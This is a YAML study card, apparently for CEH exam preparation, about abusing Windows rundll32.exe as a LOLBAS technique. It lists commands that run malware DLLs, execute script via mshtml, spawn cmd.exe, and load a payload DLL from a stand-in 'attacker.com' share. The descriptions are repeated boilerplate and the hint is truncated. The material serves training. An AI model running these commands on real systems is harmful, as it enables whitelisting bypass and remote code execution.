tool: rundll32
tags:
- m11
- network
- cli
exam_hint: 'Rundll32.exe is a built-in Windows utility that loads and executes functions exported by DLL files. While it is legitimately used by Windows to run Control Panel applets and system functions, it is heavily abused by threat actors as a LOLBAS technique to execute malicious DLLs, bypass application whitelisting, and run shellcode without creating a separate executable. Because rundll32.exe is a sign Strategy: nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on th'
docs:
- https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
- https://attack.mitre.org/techniques/T1218/011/
- https://redcanary.com/threat-detection-report/techniques/rundll32/
actions:
- title: Rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl
- title: Rundll32.exe C:\malware.dll,ExportedFunction
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe C:\malware.dll,ExportedFunction
- title: Rundll32.exe C:\malware.dll,#1
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe C:\malware.dll,#1
- title: Rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";ale
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('XSS')
- title: Rundll32.exe \attacker.com\share\payload.dll,EntryPoint
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe \attacker.com\share\payload.dll,EntryPoint
- title: Rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe
- title: Rundll32.exe malicious.dll,Main
  desc: Runs `rundll32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
  command: rundll32.exe malicious.dll,Main
